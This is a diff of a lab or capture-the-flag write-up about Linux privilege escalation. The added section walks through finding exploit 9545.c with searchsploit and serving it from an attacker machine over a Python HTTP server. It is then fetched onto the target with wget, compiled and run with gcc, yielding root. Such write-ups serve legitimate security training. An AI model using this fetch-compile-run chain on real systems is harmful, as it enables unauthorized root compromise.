@@ -96,13 +96,29 @@ Unfortunately I didnt get much information out of that, but I got enough. Which 
 
 ![S](Images/linenumOutput.png)
 
-## Box 2
-![S](Images/nmap2_1.png)
-#### Box 2 pt.2
-![S](Images/nmap2_2.png)
-#### Box 3
-![S](Images/nmap3.png)
+#### The Final Stage
 
-While I initially chose to go at all of these boxes at once, organizing myself through diligent note taking, I eventually decided to hit these boxes one at a time to keep all of my thoughts organized. So, that is the way Ill be writing this out from this point forward. 
+Now that the OS and Kernel version are both confirmed, its a good time to go search for a relevant exploit. I chose to use searchsploit for this on my KaliBox.. 
 
-Starting with the first scan, I see that there is an open http port on 8080 (not the default). So I go and check that site out but there isnt much to look at.
+![S](Images/searchsploit.png)
+
+This first exploit looks promising. So, I copy the file to my engagement directory `cp /usr/share/exploitdb/exploits/linux/local/9545.c /your/engagement/directory/9545.c`and start a python http server inside of it `python3 -m http.server`
+
+The server defaults to port 8000, so on the target machine (in /tmp) I ran `wget http://m.y.i.p:8000/9545.c` which copied the exploit over to the target machine.
+
+![S](Images/exploitcopy.png)
+
+Finally, its time to compile and exploit. This can all be done with one single command by to using the gcc compiler on 9545.c and outputting to another file called 9545. Then using `&&` I run the new 9545 file after the compiling is completed.  
+
+The final command looks like this: `$ gcc 9545.c -o 9545 && ./9545`
+
+![S](Images/rootaccess.png)
+**We have root**
+
+### Final thoughts on this first box
+
+I had a great time with this exercise. It was a good way to get some practice with linux privlige escalation exploits that I dont often get. Most of my experience with linux priv esc comes in the form of exploiting cronjobs or suid permissions. So, needless to say this was a welcome change of pace for me. 
+
+Any questions? Feel free to contact me via email: jwautry93@gmail.com you can also reach out to me on linkedin.
+
+**Thanks for reading**
